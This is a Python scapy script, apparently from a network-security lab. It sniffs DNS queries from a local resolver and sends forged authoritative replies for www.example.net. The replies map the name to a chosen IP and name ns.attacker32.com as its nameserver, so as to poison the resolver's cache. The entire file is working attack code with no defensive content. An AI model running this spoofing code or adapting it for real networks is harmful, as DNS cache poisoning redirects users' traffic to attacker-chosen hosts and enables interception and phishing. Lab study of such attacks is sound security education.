#!/usr/bin/env python3

from scapy.all import DNS, IP, sniff, UDP, DNSRR, send
IFACE = 'br-fb2031069502'  # FIXME : Change this to 10.9.0.1 network interface
# Sniff UDP query packets and invoke spoof_dns().
# Spoof the DNS response to www.example.net for the query packets
# FILTER = 'udp and dst port 53'
# Poison the cache of local DNS server to resolve www.example.net to
FILTER = 'udp and src host 10.9.0.53 and dst port 53'
DOMAIN = 'www.example.net'
# Pick an IP address to which the DNS response should be spoofed
SPOOFED_IP = '208.67.220.220'  # open DNS IP address


def spoof_dns(pkt):
    if DNS in pkt:
        if DOMAIN in pkt[DNS].qd.qname.decode('utf-8'):
            print(
                f"DNS: {pkt[IP].src}: {pkt[UDP].sport} --> \
                    {pkt[IP].dst}: {pkt[UDP].dport} id: {pkt[DNS].id} \
                        {pkt[DNS].qd.qname.decode('utf-8')}")
            print(f'Found {DOMAIN} in query...')
            # Swap the source and destination IP address
            IP_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

            # Swap the source and destination port number
            UDP_pkt = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

            # The Answer Section
            Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                            rdata=SPOOFED_IP, ttl=259200)

            # The Authority Section
            NS_sec = DNSRR(rrname=DOMAIN, type='NS',
                           rdata='ns.attacker32.com', ttl=259200)

            # Construct the DNS packet
            # qr = 1 (response), opcode = 0 (standard query),
            # aa = 1 (authoritative answer)
            DNS_pkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                          qdcount=1, ancount=1, an=Ans_sec, nscount=1,
                          ns=NS_sec)

            # Construct the entire IP packet and send it out
            spoofpkt = IP_pkt/UDP_pkt/DNS_pkt
            print("Sending spoofed packet")
            print(spoofpkt.show())
            send(spoofpkt)
        else:
            print('No DNS query for ', DOMAIN,
                  pkt[DNS].qd.qname.decode('utf-8'))


if __name__ == "__main__":
    print('Starting DNS sniffing & spoofing...')
    pkt = sniff(iface=IFACE, filter=FILTER, prn=spoof_dns)
